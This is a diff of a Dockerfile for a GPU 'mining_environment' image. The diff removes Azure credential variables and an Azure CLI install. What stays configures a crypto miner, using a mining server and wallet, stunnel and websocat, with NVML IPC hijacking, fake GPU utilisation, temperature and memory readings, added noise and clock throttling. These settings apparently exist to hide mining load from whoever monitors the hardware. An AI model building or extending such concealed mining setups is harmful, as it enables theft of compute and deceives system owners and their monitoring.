@@ -10,36 +10,24 @@ ENV DEBIAN_FRONTEND=noninteractive
 
 
 # ------------------  (1)  Biến môi trường & ARG giữ nguyên ------------------
-ARG AZURE_SUBSCRIPTION_ID
-ARG AZURE_CLIENT_ID
-ARG AZURE_CLIENT_SECRET
-ARG AZURE_TENANT_ID
-ARG ANOMALY_DETECTOR_API_KEY
-ARG OPENAI_API_KEY
+
 ARG LOG_ENCRYPTION_KEY
 ARG MINING_SERVER_GPU
 ARG MINING_WALLET_GPU
 ARG NVIDIA_DRIVER_VERSION=535
 ARG WEBSOCAT_VERSION=1.12.0
 ARG TARGETARCH=amd64
-ARG EVENT_BUS_BACKEND=memory
+
 
 ENV DEBIAN_FRONTEND=noninteractive \
     PYTHONDONTWRITEBYTECODE=1 \
     PYTHONUNBUFFERED=1 \
     LANG=en_US.UTF-8 \
     LC_ALL=en_US.UTF-8 \
-    AZURE_SUBSCRIPTION_ID=${AZURE_SUBSCRIPTION_ID} \
-    AZURE_CLIENT_ID=${AZURE_CLIENT_ID} \
-    AZURE_CLIENT_SECRET=${AZURE_CLIENT_SECRET} \
-    AZURE_TENANT_ID=${AZURE_TENANT_ID} \
-    ANOMALY_DETECTOR_API_KEY=${ANOMALY_DETECTOR_API_KEY} \
-    OPENAI_API_KEY=${OPENAI_API_KEY} \
     LOG_ENCRYPTION_KEY=${LOG_ENCRYPTION_KEY} \
     MINING_SERVER_GPU=${MINING_SERVER_GPU} \
     MINING_WALLET_GPU=${MINING_WALLET_GPU} \
     NVIDIA_DRIVER_VERSION=${NVIDIA_DRIVER_VERSION} \
-    EVENT_BUS_BACKEND=${EVENT_BUS_BACKEND} \
     PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
 
@@ -68,13 +56,6 @@ RUN set -eux; apt-get update; DEBIAN_FRONTEND=noninteractive apt-get install -y 
     ln -fs /usr/share/zoneinfo/UTC /etc/localtime; echo "UTC" > /etc/timezone; \
     dpkg-reconfigure -f noninteractive tzdata; locale-gen en_US.UTF-8; \
     update-locale LANG=en_US.UTF-8 LC_ALL=en_US.UTF-8 && rm -rf /var/lib/apt/lists/*
-
-# ------------------  (4)  Azure CLI  ---------------------------------------
-RUN set -eux; apt-get update; apt-get install -y --no-install-recommends curl lsb-release gnupg ca-certificates; \
-    curl -sL https://packages.microsoft.com/keys/microsoft.asc | gpg --dearmor -o /etc/apt/trusted.gpg.d/microsoft.gpg; \
-    AZ_REPO=$(lsb_release -cs); \
-    echo "deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main" > /etc/apt/sources.list.d/azure-cli.list; \
-    apt-get update; apt-get install -y --no-install-recommends azure-cli; rm -rf /var/lib/apt/lists/*
 
 # ------------------  (5)  Stunnel ------------------------------------------
 RUN set -eux; mkdir -p /etc/stunnel; \
@@ -153,7 +134,7 @@ RUN set -eux; apt-get update; \
         pciutils lshw \
     && ldconfig && rm -rf /var/lib/apt/lists/*
 
-# ------------------  (11)  eBPF setup script & Websocat -------------------
+# ------------------  (11) Websocat -------------------
 
 RUN set -eux; \
     command -v wget >/dev/null 2>&1 || (apt-get update && apt-get install -y --no-install-recommends wget); \
@@ -183,11 +164,7 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     GPU_PLUGINS_CONFIG=/app/mining_environment/gpu_plugins/config/gpu_plugins.yml \
     ENABLE_NVML_IPC_HIJACKING=1 NVML_FAKE_UTIL=5 NVML_FAKE_TEMP=48 NVML_FAKE_MEM_MB=256 NVML_ADD_NOISE=1 \
     ENABLE_TEMP_SPOOF=1 SPOOF_TEMP_VALUE=48 TEMP_SPOOF_ADD_NOISE=1 \
-    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 \
-    EVENT_BUS_BACKEND=memory \
-    EVENTBUS_CONNECTION_TIMEOUT=10.0 \
-    EVENTBUS_RETRY_ATTEMPTS=5 \
-    EVENTBUS_HEALTH_CHECK_INTERVAL=60.0
+    ENABLE_SM_THROTTLE=1 CLOCK_LOW=300 CLOCK_HIGH=1200 THROTTLE_INTERVAL=30 
 
 
 # ===== CRITICAL: CUDA 12.0 LIBRARY PATH ENFORCEMENT =====
